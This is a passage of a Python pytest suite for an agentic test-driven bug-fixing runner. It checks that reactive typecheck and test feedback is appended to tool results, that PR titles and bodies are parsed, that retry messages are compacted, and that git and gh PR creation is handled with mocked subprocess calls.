        result = execute_tool("str_replace_editor", {
            "path": "src/file.ts",
            "old_str": "const value = 1;\n",
            "new_str": "const value = 'bad';\n",
        })

        assert result.startswith("OK: replaced in src/file.ts")
        assert "[Reactive typecheck]" in result
        assert "TS123" in result
        assert "belongs to this fix" in result
        assert "Do not classify it as unrelated" in result

    def test_reactive_typecheck_shows_multiline_error_context(self, tmp_path, monkeypatch):
        """tsc errors are multiline — the type name often appears on a continuation line.
        The reactive feedback must include those lines, not just lines containing 'error'."""
        src = tmp_path / "src"
        src.mkdir()
        target = src / "file.ts"
        target.write_text("const value = 1;\n")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.detect_quality_tools",
            lambda lang_name: [{"name": "typecheck", "command": "fake-tsc --noEmit"}]
            if lang_name == "typescript" else [],
        )

        # Real tsc output: error line + continuation with the expected type
        tsc_output = (
            "src/file.ts(123,10): error TS2769: No overload matches this call.\n"
            "  Overload 1 of 2, '(event: \"resub\", listener: (channel: string, "
            "username: string, months: number, message: string, "
            "userstate: SubUserstate, methods: SubMethods) => void): Client'\n"
            "  gave the following error.\n"
            "    Argument of type '(channel: string, username: string) => void' "
            "is not assignable to parameter of type '(channel: string, username: string, "
            "months: number, message: string, userstate: SubUserstate, methods: SubMethods) => void'.\n"
        )

        def fake_run(command, **kwargs):
            return SimpleNamespace(returncode=1, stdout=tsc_output, stderr="")

        monkeypatch.setattr("agentic_tdd_runner.agent.subprocess.run", fake_run)

        result = execute_tool("str_replace_editor", {
            "path": "src/file.ts",
            "old_str": "const value = 1;\n",
            "new_str": "const value = 'bad';\n",
        })

        # The model MUST see 'SubUserstate' — that's the type it needs to import
        assert "SubUserstate" in result
        # And 'SubMethods' — the full overload signature
        assert "SubMethods" in result

    def test_reactive_typecheck_shows_all_errors_not_just_three(self, tmp_path, monkeypatch):
        """When tsc reports >3 errors, all should be visible, not truncated to 3."""
        src = tmp_path / "src"
        src.mkdir()
        target = src / "file.ts"
        target.write_text("const value = 1;\n")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.detect_quality_tools",
            lambda lang_name: [{"name": "typecheck", "command": "fake-tsc --noEmit"}]
            if lang_name == "typescript" else [],
        )

        tsc_output = "\n".join(
            f"src/file.ts({i},1): error TS{1000+i}: error number {i}"
            for i in range(1, 8)  # 7 errors
        ) + "\n"

        def fake_run(command, **kwargs):
            return SimpleNamespace(returncode=1, stdout=tsc_output, stderr="")

        monkeypatch.setattr("agentic_tdd_runner.agent.subprocess.run", fake_run)

        result = execute_tool("str_replace_editor", {
            "path": "src/file.ts",
            "old_str": "const value = 1;\n",
            "new_str": "const value = 'bad';\n",
        })

        # All 7 errors must be present, not just the first 3
        for i in range(1, 8):
            assert f"TS{1000+i}" in result, f"error TS{1000+i} was truncated from output"

    def test_str_replace_editor_keeps_success_silent_when_typecheck_passes(self, tmp_path, monkeypatch):
        src = tmp_path / "src"
        src.mkdir()
        target = src / "file.ts"
        target.write_text("const value = 1;\n")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.detect_quality_tools",
            lambda lang_name: [{"name": "typecheck", "command": "fake-tsc --noEmit"}]
            if lang_name == "typescript" else [],
        )

        monkeypatch.setattr(
            "agentic_tdd_runner.agent.subprocess.run",
            lambda command, **kwargs: SimpleNamespace(returncode=0, stdout="", stderr=""),
        )

        result = execute_tool("str_replace_editor", {
            "path": "src/file.ts",
            "old_str": "const value = 1;\n",
            "new_str": "const value = 2;\n",
        })

        assert result == "OK: replaced in src/file.ts"

    def test_reactive_typecheck_fires_for_python_files(self, tmp_path, monkeypatch):
        """Editing a .py file should trigger reactive typecheck if mypy/pyright is detected."""
        src = tmp_path / "src"
        src.mkdir()
        target = src / "util.py"
        target.write_text("def greet(name: str) -> str:\n    return name\n")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.detect_quality_tools",
            lambda lang_name: [{"name": "typecheck", "command": "fake-mypy"}]
            if lang_name == "python" else [],
        )

        mypy_output = (
            "src/util.py:2: error: Incompatible return value type "
            "(got \"int\", expected \"str\")  [return-value]\n"
            "Found 1 error in 1 file (checked 1 source file)\n"
        )

        def fake_run(command, **kwargs):
            return SimpleNamespace(returncode=1, stdout=mypy_output, stderr="")

        monkeypatch.setattr("agentic_tdd_runner.agent.subprocess.run", fake_run)

        result = execute_tool("str_replace_editor", {
            "path": "src/util.py",
            "old_str": "    return name\n",
            "new_str": "    return 42\n",
        })

        assert "[Reactive typecheck]" in result
        assert "Incompatible return value type" in result
        assert "expected \"str\"" in result

    def test_create_file_appends_reactive_test_failure(self, tmp_path, monkeypatch):
        src = tmp_path / "src"
        src.mkdir()

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"command": "bun test"},
            "timeouts": {"tool_execution": 10, "test_run": 10},
        })
        monkeypatch.setattr("agentic_tdd_runner.agent.detect_quality_tools", lambda lang_name: [])

        def fake_run(command, **kwargs):
            assert command == ["bun", "test", "src/file.test.ts"]
            return SimpleNamespace(
                returncode=1,
                stdout="src/file.test.ts:\n10 | expect(true).toBe(false)\n",
                stderr="",
            )

        monkeypatch.setattr("agentic_tdd_runner.agent.subprocess.run", fake_run)

        result = execute_tool("create_file", {
            "path": "src/file.test.ts",
            "content": "test('x', () => {});\n",
        })

        assert result.startswith("OK: created src/file.test.ts")
        assert "[Reactive test]" in result
        assert "expect(true).toBe(false)" in result

    def test_create_file_keeps_success_silent_when_test_passes(self, tmp_path, monkeypatch):
        src = tmp_path / "src"
        src.mkdir()

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"command": "bun test"},
            "timeouts": {"tool_execution": 10, "test_run": 10},
        })
        monkeypatch.setattr("agentic_tdd_runner.agent.detect_quality_tools", lambda lang_name: [])

        monkeypatch.setattr(
            "agentic_tdd_runner.agent.subprocess.run",
            lambda command, **kwargs: SimpleNamespace(returncode=0, stdout="3 pass\n", stderr=""),
        )

        result = execute_tool("create_file", {
            "path": "src/file.test.ts",
            "content": "test('x', () => {});\n",
        })

        assert result == "OK: created src/file.test.ts"


class TestParsePrContent:
    """_parse_pr_content extracts title and body from LLM response."""

    def test_extracts_title_and_body(self):
        content = "PR_TITLE: fix: use cumulative months in handleResub\nPR_BODY: The bug was in handleResub."
        title, body = _parse_pr_content(content)
        assert title == "fix: use cumulative months in handleResub"
        assert "handleResub" in body

    def test_truncates_long_title(self):
        content = "PR_TITLE: " + "x" * 100 + "\nPR_BODY: body"
        title, body = _parse_pr_content(content)
        assert len(title) <= 70

    def test_returns_none_on_missing_format(self):
        content = "Here is a PR for you."
        title, body = _parse_pr_content(content)
        assert title is None
        assert body is None

    def test_multiline_body(self):
        content = "PR_TITLE: fix bug\nPR_BODY: ## Summary\n\n- Fixed the bug\n- Added tests"
        title, body = _parse_pr_content(content)
        assert "Summary" in body
        assert "Added tests" in body


class TestMessageCompaction:
    """Quality-fail retries should carry compact state, not stale tool chatter."""

    def test_compacts_quality_retry_to_system_issue_and_feedback(self):
        messages = [
            {"role": "system", "content": "system prompt"},
            {"role": "user", "content": "Fix this bug:\n\nbug text"},
            {"role": "assistant", "content": None, "tool_calls": [{"id": "call_1"}]},
            {"role": "tool", "tool_call_id": "call_1", "content": "very long tool output"},
            {"role": "user", "content": "old retry feedback"},
        ]

        compacted = _compact_messages_after_quality_failure(
            messages,
            "QUALITY CHECK FAILED\n\n[typecheck] boom",
            "src/file.test.ts",
        )

        assert [msg["role"] for msg in compacted] == ["system", "user", "user"]
        assert compacted[0]["content"] == "system prompt"
        assert compacted[1]["content"] == "Fix this bug:\n\nbug text"
        assert "Verification already passed for src/file.test.ts" in compacted[2]["content"]
        assert "QUALITY CHECK FAILED" in compacted[2]["content"]
        assert "very long tool output" not in compacted[2]["content"]


class TestQualityFailureCompactionPolicy:
    def test_skips_compaction_when_prompt_has_enough_headroom(self, monkeypatch):
        from agentic_tdd_runner.agent import _should_compact_after_quality_failure

        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "llm": {"context_window_tokens": 32768},
            "quality": {},
        })

        should_compact, info = _should_compact_after_quality_failure({"prompt_tokens": 9131})

        assert should_compact is False
        assert info["reason"] == "enough_headroom"
        assert info["headroom_tokens"] == 23637

    def test_compacts_when_prompt_is_near_context_limit(self, monkeypatch):
        from agentic_tdd_runner.agent import _should_compact_after_quality_failure

        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "llm": {"context_window_tokens": 32768},
            "quality": {},
        })

        should_compact, info = _should_compact_after_quality_failure({"prompt_tokens": 30000})

        assert should_compact is True
        assert info["reason"] == "near_context_limit"
        assert info["headroom_tokens"] == 2768


class TestCreatePr:
    """create_pr asks the LLM for content and runs git+gh commands."""

    def _init_repo(self, tmp_path):
        subprocess.run([GIT, "init", "-b", "main"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "config", "user.email", "t@t"], cwd=tmp_path, capture_output=True)
        subprocess.run([GIT, "config", "user.name", "t"], cwd=tmp_path, capture_output=True)

    def test_creates_branch_commit_push_pr(self, tmp_path, monkeypatch):
        from unittest.mock import patch as mock_patch, call

        self._init_repo(tmp_path)
        (tmp_path / "file.ts").write_text("code")
        subprocess.run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "commit", "-m", "init"], cwd=tmp_path, capture_output=True, check=True)
        (tmp_path / "file.ts").write_text("fixed code")
        (tmp_path / "file.test.ts").write_text("test code")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "pr": {"enabled": True, "base_branch": "main", "branch_prefix": "atm/fix-"},
            "prompt": {"pr_prompt": "Generate PR"},
            "llm": {"model": "test", "url": "http://localhost:9999/v1/chat/completions"},
            "timeouts": {"llm_request": 10, "pr_create": 10},
        })

        mock_response = {
            "choices": [{"message": {"content": "PR_TITLE: fix: handle cumulative months\nPR_BODY: Fixed the bug."}}],
        }

        commands_run = []
        original_run = subprocess.run

        def track_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list):
                commands_run.append(cmd)
                if cmd[:3] == ["gh", "pr", "create"]:
                    return subprocess.CompletedProcess(cmd, 0, stdout="https://github.com/test/pr/1\n")
                if cmd[:2] == ["git", "push"]:
                    return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")
                return original_run(*args, **kwargs)
            return original_run(*args, **kwargs)

        with mock_patch("agentic_tdd_runner.agent.chat", return_value=mock_response):
            with mock_patch("subprocess.run", side_effect=track_run):
                result = create_pr([], {}, "test.ts", 10)

        cmd_strs = [" ".join(c) for c in commands_run]
        assert any("checkout -b" in c for c in cmd_strs), f"No checkout -b: {cmd_strs}"
        assert any("add" in c for c in cmd_strs), f"No git add: {cmd_strs}"
        assert any("commit" in c for c in cmd_strs), f"No git commit: {cmd_strs}"
        assert any("push" in c for c in cmd_strs), f"No git push: {cmd_strs}"
        assert any("gh pr create" in c for c in cmd_strs), f"No gh pr create: {cmd_strs}"

    def test_returns_none_when_head_diverged_from_base_branch(self, tmp_path, monkeypatch):
        from unittest.mock import patch as mock_patch

        self._init_repo(tmp_path)
        (tmp_path / "file.ts").write_text("code")
        subprocess.run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "commit", "-m", "init"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "checkout", "-b", "feature/drift"], cwd=tmp_path, capture_output=True, check=True)
        (tmp_path / "extra.ts").write_text("history drift")
        subprocess.run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "commit", "-m", "drift"], cwd=tmp_path, capture_output=True, check=True)
        (tmp_path / "file.ts").write_text("fixed code")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "pr": {"enabled": True, "base_branch": "main", "branch_prefix": "atm/fix-"},
            "prompt": {"pr_prompt": "Generate PR"},
            "llm": {"model": "test", "url": "http://localhost:9999/v1/chat/completions"},
            "timeouts": {"llm_request": 10, "pr_create": 10},
        })

        with mock_patch("agentic_tdd_runner.agent.chat") as chat_mock:
            result = create_pr([], {}, "file.ts", 1)

        assert result is None
        chat_mock.assert_not_called()

    def test_pr_stages_tracked_changes_and_filters_untracked(self, tmp_path, monkeypatch):
        """create_pr stages all tracked modified files (incl config) but only language-matching untracked."""
        from unittest.mock import patch as mock_patch

        self._init_repo(tmp_path)
        (tmp_path / "file.ts").write_text("code")
        (tmp_path / "package.json").write_text('{"name": "test"}')
        (tmp_path / "obsolete.ts").write_text("dead code")
        subprocess.run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "commit", "-m", "init"], cwd=tmp_path, capture_output=True, check=True)
        (tmp_path / "file.ts").write_text("fixed code")
        (tmp_path / "package.json").write_text('{"name": "test", "scripts": {"typecheck": "tsc"}}')
        (tmp_path / "obsolete.ts").unlink()
        (tmp_path / "file.test.ts").write_text("test code")
        (tmp_path / "agent-session.jsonl").write_text('{"log": "entry"}')
        (tmp_path / "notes.md").write_text("scratch notes")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "pr": {"enabled": True, "base_branch": "main", "branch_prefix": "atm/fix-"},
            "prompt": {"pr_prompt": "Generate PR"},
            "llm": {"model": "test", "url": "http://localhost:9999/v1/chat/completions"},
            "timeouts": {"llm_request": 10, "pr_create": 10},
        })

        mock_response = {
            "choices": [{"message": {"content": "PR_TITLE: fix bug\nPR_BODY: Fixed."}}],
        }

        add_commands = []
        original_run = subprocess.run

        def track_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list):
                if len(cmd) > 1 and cmd[1] == "add":
                    add_commands.append(cmd)
                if cmd[0] == "gh" or (len(cmd) > 1 and "push" in cmd):
                    return subprocess.CompletedProcess(cmd, 0, stdout="https://github.com/test/pr/1\n")
                return original_run(*args, **kwargs)
            return original_run(*args, **kwargs)

        with mock_patch("agentic_tdd_runner.agent.chat", return_value=mock_response):
            with mock_patch("subprocess.run", side_effect=track_run):
                create_pr([], {}, "file.test.ts", 10)

        assert len(add_commands) == 1, f"Expected one git add call, got {add_commands}"
        staged_files = add_commands[0][3:]  # after [GIT, 'add', '--']
        assert "file.ts" in staged_files, f"Source file missing: {staged_files}"
        assert "package.json" in staged_files, f"Config file missing from PR: {staged_files}"
        assert "obsolete.ts" in staged_files, f"Deleted file missing from PR: {staged_files}"
        assert "file.test.ts" in staged_files, f"New test file missing: {staged_files}"
        assert "agent-session.jsonl" not in staged_files, f"Log file staged: {staged_files}"
        assert "notes.md" not in staged_files, f"Non-language file staged: {staged_files}"

    def test_pr_chat_call_excludes_tools(self, tmp_path, monkeypatch):
        """create_pr must call chat without tools so the LLM returns text, not tool_calls."""
        from unittest.mock import patch as mock_patch

        self._init_repo(tmp_path)
        (tmp_path / "file.ts").write_text("code")
        subprocess.run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "commit", "-m", "init"], cwd=tmp_path, capture_output=True, check=True)
        (tmp_path / "file.ts").write_text("fixed")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "pr": {"enabled": True, "base_branch": "main", "branch_prefix": "atm/fix-"},
            "prompt": {"pr_prompt": "Generate PR"},
            "llm": {"model": "test", "url": "http://localhost:9999/v1/chat/completions"},
            "timeouts": {"llm_request": 10, "pr_create": 10},
            "tools": [{"type": "function", "function": {"name": "run_test"}}],
        })

        chat_kwargs = []
        mock_response = {
            "choices": [{"message": {"content": "PR_TITLE: fix\nPR_BODY: done"}}],
        }

        original_chat = None

        def capture_chat(messages, include_tools=True):
            chat_kwargs.append({"include_tools": include_tools})
            return mock_response

        original_run = subprocess.run

        def fake_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list) and (cmd[0] == "gh" or (cmd[0] == "git" and "push" in cmd)):
                return subprocess.CompletedProcess(cmd, 0, stdout="https://github.com/test/pr/1\n")
            return original_run(*args, **kwargs)

        with mock_patch("agentic_tdd_runner.agent.chat", side_effect=capture_chat):
            with mock_patch("subprocess.run", side_effect=fake_run):
                create_pr([], {}, "file.ts", 1)

        assert len(chat_kwargs) == 1, f"Expected 1 chat call, got {chat_kwargs}"
        assert chat_kwargs[0]["include_tools"] is False, \
            "create_pr should call chat with include_tools=False to prevent tool_calls"

    def test_pr_uses_deterministic_fallback_when_chat_fails(self, tmp_path, monkeypatch):
        from unittest.mock import patch as mock_patch

        self._init_repo(tmp_path)
        (tmp_path / "file.ts").write_text("code")
        subprocess.run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "commit", "-m", "init"], cwd=tmp_path, capture_output=True, check=True)
        (tmp_path / "file.ts").write_text("fixed")
        (tmp_path / "file.test.ts").write_text("test code")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "pr": {"enabled": True, "base_branch": "main", "branch_prefix": "atm/fix-"},
            "prompt": {"pr_prompt": "Generate PR"},
            "llm": {"model": "test", "url": "http://localhost:9999/v1/chat/completions"},
            "timeouts": {"llm_request": 10, "pr_create": 10},
        })

        commands_run = []
        original_run = subprocess.run

        def track_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list):
                commands_run.append(cmd)
                if cmd[0] == "gh" or (cmd[0] == "git" and "push" in cmd):
                    return subprocess.CompletedProcess(cmd, 0, stdout="https://github.com/test/pr/1\n")
                return original_run(*args, **kwargs)
            return original_run(*args, **kwargs)

        with mock_patch("agentic_tdd_runner.agent.chat", side_effect=Exception("timeout")):
            with mock_patch("subprocess.run", side_effect=track_run):
                result = create_pr([], {}, "file.test.ts", 10)

        assert result == "https://github.com/test/pr/1"
        assert any(cmd[:3] == ["gh", "pr", "create"] for cmd in commands_run)
        commit_commands = [cmd for cmd in commands_run if cmd[:2] == ["git", "commit"]]
        assert commit_commands
        commit_text = " ".join(commit_commands[0])
        assert "fix: update file behavior" in commit_text
        assert "Harness quality checks passed" in commit_text

    def test_pr_subprocess_calls_use_text_and_timeout(self, tmp_path, monkeypatch):
        """Checked subprocess calls in create_pr should use text mode and bounded timeouts."""
        from unittest.mock import patch as mock_patch

        self._init_repo(tmp_path)
        (tmp_path / "file.ts").write_text("code")
        subprocess.run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "commit", "-m", "init"], cwd=tmp_path, capture_output=True, check=True)
        (tmp_path / "file.ts").write_text("fixed")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "pr": {"enabled": True, "base_branch": "main", "branch_prefix": "atm/fix-"},
            "prompt": {"pr_prompt": "Generate PR"},
            "llm": {"model": "test", "url": "http://localhost:9999/v1/chat/completions"},
            "timeouts": {"llm_request": 10, "pr_create": 10},
        })

        mock_response = {
            "choices": [{"message": {"content": "PR_TITLE: fix\nPR_BODY: done"}}],
        }

        observed = []
        original_run = subprocess.run

        def capture_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list):
                observed.append((cmd, kwargs))
                if cmd[0] == "gh" or (cmd[0] == "git" and "push" in cmd):
                    return subprocess.CompletedProcess(cmd, 0, stdout="https://github.com/test/pr/1\n")
            return original_run(*args, **kwargs)

        with mock_patch("agentic_tdd_runner.agent.chat", return_value=mock_response):
            with mock_patch("subprocess.run", side_effect=capture_run):
                create_pr([], {}, "file.ts", 1)

        checked = [
            (cmd, kwargs) for cmd, kwargs in observed
            if isinstance(cmd, list) and (
                cmd[:3] == ["git", "checkout", "-b"]
                or cmd[:2] == ["git", "add"]
                or cmd[:2] == ["git", "commit"]
                or cmd[:2] == ["git", "push"]
                or cmd[:3] == ["gh", "pr", "create"]
            )
        ]
        assert checked, observed
        for _cmd, kwargs in checked:
            assert kwargs.get("text") is True
            assert kwargs.get("timeout") == 10

    def test_returns_none_on_push_timeout_with_readable_message(self, tmp_path, monkeypatch):
        """A push timeout should return None and emit a readable message."""
        from unittest.mock import patch as mock_patch

        self._init_repo(tmp_path)
        (tmp_path / "file.ts").write_text("code")
        subprocess.run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "commit", "-m", "init"], cwd=tmp_path, capture_output=True, check=True)
        (tmp_path / "file.ts").write_text("fixed")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "pr": {"enabled": True, "base_branch": "main", "branch_prefix": "atm/fix-"},
            "prompt": {"pr_prompt": "Generate PR"},
            "llm": {"model": "test", "url": "http://localhost:9999/v1/chat/completions"},
            "timeouts": {"llm_request": 10, "pr_create": 10},
        })

        mock_response = {
            "choices": [{"message": {"content": "PR_TITLE: fix\nPR_BODY: done"}}],
        }

        emitted = []
        original_run = subprocess.run

        def run_with_push_timeout(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list) and cmd[:2] == ["git", "push"]:
                raise subprocess.TimeoutExpired(cmd=cmd, timeout=10)
            if isinstance(cmd, list) and cmd[0] == "gh":
                return subprocess.CompletedProcess(cmd, 0, stdout="https://github.com/test/pr/1\n")
            return original_run(*args, **kwargs)

        with mock_patch("agentic_tdd_runner.agent.chat", return_value=mock_response):
            with mock_patch("agentic_tdd_runner.agent.emit", side_effect=emitted.append):
                with mock_patch("subprocess.run", side_effect=run_with_push_timeout):
                    result = create_pr([], {}, "file.ts", 1)

        assert result is None
        assert any("Command timed out:" in msg for msg in emitted), emitted
        assert not any("b'" in msg for msg in emitted), emitted

    def test_returns_none_when_gh_missing(self, tmp_path, monkeypatch):
        """create_pr must return None (not crash) when gh CLI is absent."""
        from unittest.mock import patch as mock_patch

        self._init_repo(tmp_path)
        (tmp_path / "file.ts").write_text("code")
        subprocess.run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "commit", "-m", "init"], cwd=tmp_path, capture_output=True, check=True)
        (tmp_path / "file.ts").write_text("fixed")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "pr": {"enabled": True, "base_branch": "main", "branch_prefix": "atm/fix-"},
            "prompt": {"pr_prompt": "Generate PR"},
            "llm": {"model": "test", "url": "http://localhost:9999/v1/chat/completions"},
            "timeouts": {"llm_request": 10, "pr_create": 10},
        })

        mock_response = {
            "choices": [{"message": {"content": "PR_TITLE: fix\nPR_BODY: done"}}],
        }

        original_run = subprocess.run

        def run_raises_on_gh(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list) and cmd[0] == "gh":
                raise FileNotFoundError("No such file or directory: 'gh'")
            if isinstance(cmd, list) and cmd[0] == "git" and "push" in cmd:
                return subprocess.CompletedProcess(cmd, 0, stdout="")
            return original_run(*args, **kwargs)

        with mock_patch("agentic_tdd_runner.agent.chat", return_value=mock_response):
            with mock_patch("subprocess.run", side_effect=run_raises_on_gh):
                result = create_pr([], {}, "file.ts", 1)

        assert result is None

    def test_returns_none_on_pr_command_timeout(self, tmp_path, monkeypatch):
        from unittest.mock import patch as mock_patch

        self._init_repo(tmp_path)
        (tmp_path / "file.ts").write_text("code")
        subprocess.run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "commit", "-m", "init"], cwd=tmp_path, capture_output=True, check=True)
        (tmp_path / "file.ts").write_text("fixed")

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "pr": {"enabled": True, "base_branch": "main", "branch_prefix": "atm/fix-"},
            "prompt": {"pr_prompt": "Generate PR"},
            "llm": {"model": "test", "url": "http://localhost:9999/v1/chat/completions"},
            "timeouts": {"llm_request": 10, "pr_create": 10},
        })

        mock_response = {
            "choices": [{"message": {"content": "PR_TITLE: fix\nPR_BODY: done"}}],
        }

        original_run = subprocess.run

        def run_raises_timeout_on_gh(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list) and cmd[0] == "gh":
                raise subprocess.TimeoutExpired(cmd, 10)
            if isinstance(cmd, list) and cmd[0] == "git" and "push" in cmd:
                return subprocess.CompletedProcess(cmd, 0, stdout="")
            return original_run(*args, **kwargs)

        with mock_patch("agentic_tdd_runner.agent.chat", return_value=mock_response):
            with mock_patch("subprocess.run", side_effect=run_raises_timeout_on_gh):
                result = create_pr([], {}, "file.ts", 1)

        assert result is None

    def test_returns_none_on_chat_failure(self, tmp_path, monkeypatch):
        from unittest.mock import patch as mock_patch

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "pr": {"enabled": True, "base_branch": "main", "branch_prefix": "atm/fix-"},
            "prompt": {"pr_prompt": "Generate PR"},
            "llm": {"model": "test", "url": "http://localhost:9999/v1/chat/completions"},
            "timeouts": {"llm_request": 10, "pr_create": 10},
        })

        with mock_patch("agentic_tdd_runner.agent.chat", side_effect=Exception("timeout")):
            result = create_pr([], {}, "test.ts", 10)

        assert result is None


class TestMain:
    """main() should only report VERIFIED after the final tree is re-checked."""

    def test_llm_timeout_logs_timeout_not_exhausted(self, tmp_path, monkeypatch):
        logged = []
        args = SimpleNamespace(
            issue="bug text", source=None, symbol=None,
            workdir=str(tmp_path), config="unused.toml", log_dir=str(tmp_path),
        )
        config = {
            "agent": {"max_steps": 3, "max_tool_output": 2000},
            "verification": {"max_rejections": 3},
            "quality": {"enabled": False},
            "prompt": {
                "system": "system prompt",
                "nudge": "Step {step}/{max_steps}. Continue.",
                "no_test_found": "no test",
                "quality_failed": "FAIL: {details}",
            },
            "llm": {"model": "test-model"},
            "timeouts": {"llm_request": 10, "tool_execution": 10, "test_run": 10},
            "runner": {"command": "bun test", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "tools": [],
            "pr": {"enabled": False},
        }

        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: config)
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda event, data: logged.append((event, data)))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.chat",
            lambda messages, include_tools=True: (_ for _ in ()).throw(requests.exceptions.ReadTimeout("read timed out")),
        )

        result = main()

        assert result == 1
        events = [event for event, _data in logged]
        assert "llm_timeout" in events
        assert "exhausted" not in events

    def test_chat_error_logs_error_not_exhausted(self, tmp_path, monkeypatch):
        logged = []
        args = SimpleNamespace(
            issue="bug text", source=None, symbol=None,
            workdir=str(tmp_path), config="unused.toml", log_dir=str(tmp_path),
        )
        config = {
            "agent": {"max_steps": 3, "max_tool_output": 2000},
            "verification": {"max_rejections": 3},
            "quality": {"enabled": False},
            "prompt": {
                "system": "system prompt",
                "nudge": "Step {step}/{max_steps}. Continue.",
                "no_test_found": "no test",
                "quality_failed": "FAIL: {details}",
            },
            "llm": {"model": "test-model"},
            "timeouts": {"llm_request": 10, "tool_execution": 10, "test_run": 10},
            "runner": {"command": "bun test", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "tools": [],
            "pr": {"enabled": False},
        }

        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: config)
        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda event, data: logged.append((event, data)))
        monkeypatch.setattr(
            "agentic_tdd_runner.agent.chat",
            lambda messages, include_tools=True: (_ for _ in ()).throw(RuntimeError("boom")),
        )

        result = main()

        assert result == 1
        events = [event for event, _data in logged]
        assert "error" in events
        assert "exhausted" not in events

    def test_logs_done_even_if_postamble_fails(self, tmp_path, monkeypatch):
        logged = []
        args = SimpleNamespace(
            issue="bug text", source=None, symbol=None,
            workdir=str(tmp_path), config="unused.toml", log_dir=str(tmp_path),
        )
        config = {
            "agent": {"max_steps": 1, "max_tool_output": 2000},
            "verification": {"max_rejections": 3},
            "quality": {"enabled": False},
            "prompt": {
                "system": "system prompt",
                "nudge": "Step {step}/{max_steps}. Continue.",
                "no_test_found": "no test",
                "quality_failed": "FAIL: {details}",
